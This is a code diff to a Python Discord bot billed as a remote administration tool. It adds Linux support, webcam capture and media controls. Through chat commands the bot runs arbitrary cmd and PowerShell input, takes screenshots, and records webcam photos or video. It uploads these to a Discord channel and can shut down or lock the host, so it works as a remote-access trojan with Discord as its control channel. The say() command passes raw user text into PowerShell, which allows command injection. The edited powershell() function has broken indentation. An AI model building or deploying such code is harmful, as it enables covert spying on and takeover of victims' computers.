@@ -14,12 +14,28 @@ import time
 # Dependency of screenshot
 from mss import mss
 
+# Dependency of media
+from lib.input_commands import InputCommands
+
+# Dependency of camera
+#from lib.camera_control import CameraControl #commented because of the workaround
+
+# For using commands in different systems
+from helpers import get_operating
+
+# Platform name 
+operating_sys = get_operating()
+
+
 # Here you can modify the bot's prefix and description and whether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
 
-# Enter Discord Bot Token & Channel ID:
-BOT_TOKEN = 'Enter Token here'
-CHANNEL_ID = 'Enter Channel ID here'
+import local_credentials as LocalCredentials
+
+#Create a local_credentials (added to .gitignore) file with the very same variables so there is no risk to commit credentials by mistake
+BOT_TOKEN = LocalCredentials.BOT_TOKEN
+CHANNEL_ID = LocalCredentials.CHANNEL_ID
+
 
 # Used by !echo(set) and !cmd / !powershell(get)
 display_output = True
@@ -62,10 +78,13 @@ async def cmd(cmnd):
 # Dependencies: time, os
 @client.command()
 async def powershell(cmnd):
-	await client.say("Executing in powershell: " + cmnd)
-	cmnd_result = os.popen("powershell {}".format(cmnd)).read()
-	if display_output == True:
-		await client.say(cmnd_result)
+	if operating_sys == "Windows":
+		await client.say("Executing in powershell: " + cmnd)
+	  cmnd_result = os.popen("powershell {}".format(cmnd)).read()
+	  if display_output == True:
+		  await client.say(cmnd_result)
+	else:
+		await client.say("Powershell is only available in Windows")
 	await asyncio.sleep(3)
 
 
@@ -78,7 +97,14 @@ async def lock(seconds = 0):
 	await client.say("Locking system.")
 	if time != 0:
 		time.sleep(seconds)
-	os.system("rundll32.exe user32.dll,LockWorkStation")
+
+	if operating_sys == "Windows":
+		os.system("rundll32.exe user32.dll,LockWorkStation")
+	elif operating_sys == "Linux":
+		os.popen('gnome-screensaver-command --lock')
+	else:
+		await client.say("Can't lock system.")
+		await asyncio.sleep(3)
 
 
 # Module: sleep
@@ -87,10 +113,14 @@ async def lock(seconds = 0):
 # Dependencies: time, os
 @client.command()
 async def sleep(seconds = 0):
-	await client.say("Putting system to sleep.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+	if operating_sys == "Windows":
+		await client.say("Putting system to sleep.")
+		if time != 0:
+			time.sleep(seconds)
+		os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+	else:
+		await client.say("Can't put system to sleep.")
+		await asyncio.sleep(3)
 
 
 # Module: shutdown
@@ -100,9 +130,17 @@ async def sleep(seconds = 0):
 @client.command()
 async def shutdown(seconds = 0):
 	await client.say("Shutting system down.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("Shutdown.exe -s -t 0")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("Shutdown.exe -s -t 0")
+	elif operating_sys == "Linux":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("shutdown")
+	else:
+		await client.say("Can't shutdown system.")
+		await asyncio.sleep(3)
 
 
 # Module: restart
@@ -112,9 +150,17 @@ async def shutdown(seconds = 0):
 @client.command()
 async def restart(seconds = 0):
 	await client.say("Restarting system.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("Shutdown.exe -r")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("Shutdown.exe -r")
+	elif operating_sys == "Linux":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("reboot")
+	else:
+		await client.say("Can't restart system.")
+		await asyncio.sleep(3)
 
 
 # Module: hibernate
@@ -124,9 +170,13 @@ async def restart(seconds = 0):
 @client.command()
 async def hibernate(seconds = 0):
 	await client.say("Hibernating system.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("rundll32.exe PowrProf.dll,SetSuspendState")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("rundll32.exe PowrProf.dll,SetSuspendState")
+	else:
+		await client.say("Can't hibernate system.")
+		await asyncio.sleep(3)
 
 
 # Module: logoff
@@ -136,9 +186,14 @@ async def hibernate(seconds = 0):
 @client.command()
 async def logoff(seconds = 0):
 	await client.say("Logging out of system.")
-	if time != 0:
-		time.sleep(seconds)
-	os.system("Shutdown.exe -l")
+	if operating_sys == "Windows":
+		if time != 0:
+			time.sleep(seconds)
+		os.system("Shutdown.exe -l")
+	else:
+		await client.say("Can't logoff system.")
+		await asyncio.sleep(3)
+	
 
 
 # Module: screenshot
@@ -163,11 +218,59 @@ async def screenshot(ctx, seconds = 0):
 # Dependencies: time, os
 @client.command()
 async def say(txt):
-	await client.say("Saying: " + txt)
-	os.system("powershell Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" + txt + "')")
+	if operating_sys == "Windows":
+		await client.say("Saying: " + txt)
+		os.system("powershell Add-Type -AssemblyName System.Speech; $synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" + txt + "')")
+	else:
+		await client.say("Can't use TTS")
 	await asyncio.sleep(3)
 
+
+# Module: media
+# Description: Controls Media Features
+# Usage: !media command or !media command times
+# Dependencies: ctypes, time
+@client.command()
+async def media(command,times=1):
+	switcher = {
+		'vol-up':InputCommands.up_volume,
+		'vol-down':InputCommands.down_volume,
+		'vol-mute':InputCommands.mute_volume,
+		'next':InputCommands.media_next,
+		'prev':InputCommands.media_previous,
+		'stop':InputCommands.media_stop,
+		'play':InputCommands.media_play_pause,
+		'pause':InputCommands.media_play_pause
+		}
 	
+	for time in range(0,times):
+		switcher[command]()
+		await asyncio.sleep(0.5)
+	
+	await client.say('Media Adjusted!')
+
+
+# Module: camera
+# Description: Records a video or takes a photo (no audio)
+# Usage: !camera command time
+# Dependencies: cv2, datetime, timedelta
+@client.command(pass_context = True)
+async def camera(ctx, command, time=5):
+	await client.say('Recording!')
+	python_alias = LocalCredentials.PYTHON_ALIAS
+	
+	if command == 'photo':
+# 		CameraControl.photo_capture()
+		os.system("{} lib/camera_control.py photo".format(python_alias))#workaround
+		await client.send_file(ctx.message.channel, 'photo.jpg')
+		
+	if command == 'video':
+# 		await CameraControl.video_capture(time=time)
+		os.system("{} lib/camera_control.py video {}".format(python_alias,time))#workaround
+		await client.send_file(ctx.message.channel, 'video.avi')
+	
+	
+
 # Module: echo
 # Description: Turns command output display to discord chat on and off (works for !cmd and !powershell)
 # Usage: !echo off or !echo on
@@ -183,5 +286,6 @@ async def echo(status):
 		await client.say("!cmd and !powershell output will be hidden from chat. ")
 	else:
 		await client.say("Parameter of echo can be off or on. ")
+
 
 client.run(BOT_TOKEN)
